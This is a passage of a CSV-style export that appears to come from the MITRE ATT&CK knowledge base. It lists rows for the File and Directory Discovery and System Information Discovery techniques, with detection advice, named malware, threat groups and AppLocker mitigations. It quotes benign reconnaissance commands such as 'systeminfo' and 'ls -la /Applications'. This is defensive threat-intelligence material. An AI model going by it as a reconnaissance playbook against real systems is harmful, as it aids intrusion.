'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']","Software: HTTPBrowser, Token Control, HttpDump",['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
173,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0072|OwaAuth]] has a command to list its directory and logical drives.[[CiteRef::Dell TG-3390]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",Software: OwaAuth,['Discovery'],['Technique/T1083'],['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
174,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0065|4H RAT]] sends an OS version identifier in its beacons.[[CiteRef::CrowdStrike Putter Panda]]'],['Putter Panda'],"['Putter Panda', 'APT2', 'MSUpdater']",['G0024'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: 4H RAT,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
175,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0021|Derusbi]] gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the machine and operating system.[[CiteRef::Fidelis Turbo]]']",['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Derusbi,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
176,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0142|StreamEx]] has the ability to enumerate system information.[[CiteRef::Cylance Shell Crew Feb 2017]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: StreamEx,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
177,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0151|HALFBAKED]] can obtain information about the OS, processor, and BIOS.[[CiteRef::FireEye FIN7 April 2017]]']",['FIN7'],['FIN7'],['G0046'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: HALFBAKED,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
178,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","[""A [[Group/G0047|Gamaredon Group]] file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.[[CiteRef::Palo Alto Gamaredon Feb 2017]]""]",['Gamaredon Group'],['Gamaredon Group'],['G0047'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
179,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0106|cmd]] can be used to find information about the operating system.[[CiteRef::TechNet Dir]]'],['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: cmd, cmd.exe",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
180,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0124|Pisloader]] has a command to collect victim system information, including the system name and OS version.[[CiteRef::Palo Alto DNS Requests]]']",['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Pisloader,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
181,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0125|Remsec]] can obtain the OS version information, computer name, processor architecture, machine role, and OS edition.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]']",['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
182,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0130|Unknown Logger]] can obtain information about the victim computer name, physical memory, country, and date.[[CiteRef::Forcepoint Monsoon]]']",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Unknown Logger,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
183,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0021|Derusbi]] gathers the name of the local host, version of GNU Compiler Collection (GCC), and the system information about the machine and operating system.[[CiteRef::Fidelis Turbo]]']",['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Derusbi,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
184,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0096|Systeminfo]] can be used to gather information about the operating system.[[CiteRef::TechNet Systeminfo]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Systeminfo, systeminfo.exe",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
185,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0004|Ke3chang]] performs operating system information discovery using <code>systeminfo</code> commands.[[CiteRef::Villeneuve et al 2014]]'],['Ke3chang'],['Ke3chang'],['G0004'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
186,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0044|JHUHUGIT]] obtains a build identifier as well as victim hard drive information from Windows registry key <code>HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum</code>.[[CiteRef::ESET Sednit Part 1]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: JHUHUGIT, Seduploader, ...",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
187,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0045|ADVSTORESHELL]] can run [[Software/S0096|Systeminfo]] to gather information about the victim.[[CiteRef::ESET Sednit Part 2]][[CiteRef::Bitdefender APT28 Dec 2015]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: ADVSTORESHELL, NETUI, ...",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
188,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0137|CORESHELL]] collects hostname, volume serial number and OS version data from the victim and sends the information to its C2 server.[[CiteRef::FireEye APT28]]']",['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: CORESHELL, SOURFACE",['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
189,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Software/S0161|XAgentOSX]] contains the getInstalledAPP function to run <code>ls -la /Applications</code> to gather what applications are installed.[[CiteRef::XAgentOSX]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: XAgentOSX,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
190,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']",['[[Group/G0007|APT28]] has enumerated installed applications on macOS devices with built-in utilities such as <code>ls -al /Applications</code>[[CiteRef::XAgentOSX]].'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
191,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0148|RTM]] can obtain the computer name, OS version, and default language identifier.[[CiteRef::ESET RTM Feb 2017]]']",['RTM'],['RTM'],['G0048'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: RTM,['Discovery'],['Technique/T1082'],['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
192,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0079|MobileOrder]] has a command to upload to its C2 server victim mobile device information, including IMEI, IMSI, SIM card serial number, phone number, Android version, and other information.[[CiteRef::Scarlet Mimic Jan 2016]]']",['Scarlet Mimic'],['Scarlet Mimic'],['G0029'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 